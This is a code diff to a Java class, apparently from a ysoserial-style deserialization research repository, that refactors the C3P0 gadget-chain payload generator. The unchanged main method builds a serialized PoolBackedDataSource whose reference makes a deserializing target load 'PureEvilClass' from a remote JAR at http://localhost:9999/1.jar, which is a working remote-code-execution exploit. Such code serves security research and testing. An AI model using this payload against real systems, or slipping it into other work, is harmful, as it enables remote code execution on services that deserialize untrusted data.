@@ -2,6 +2,7 @@ package org.su18.serialize.ysoserial.C3P0;
 
 import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+import org.su18.serialize.ysoserial.Utils.ClassUtil;
 import org.su18.serialize.ysoserial.Utils.SerializeUtil;
 
 import javax.naming.NamingException;
@@ -19,8 +20,6 @@ import java.util.logging.Logger;
  * @author su18
  */
 public class C3P0 {
-
-	public static String fileName = "C3P0.bin";
 
 	private static final class MyPool implements ConnectionPoolDataSource, Referenceable {
 
@@ -67,15 +66,15 @@ public class C3P0 {
 
 	public static void main(String[] args) throws Exception {
 
-		PoolBackedDataSource     p    = (PoolBackedDataSource) SerializeUtil.createInstanceUnsafely(PoolBackedDataSource.class);
+		PoolBackedDataSource     p    = (PoolBackedDataSource) ClassUtil.createInstanceUnsafely(PoolBackedDataSource.class);
 		ConnectionPoolDataSource pool = new MyPool("org.su18.serializable.PureEvilClass", "http://localhost:9999/1.jar");
 
 		Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
 		field.setAccessible(true);
 		field.set(p, pool);
 
-		SerializeUtil.writeObjectToFile(p, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(p);
+		SerializeUtil.readFileObject();
 	}
 
 }
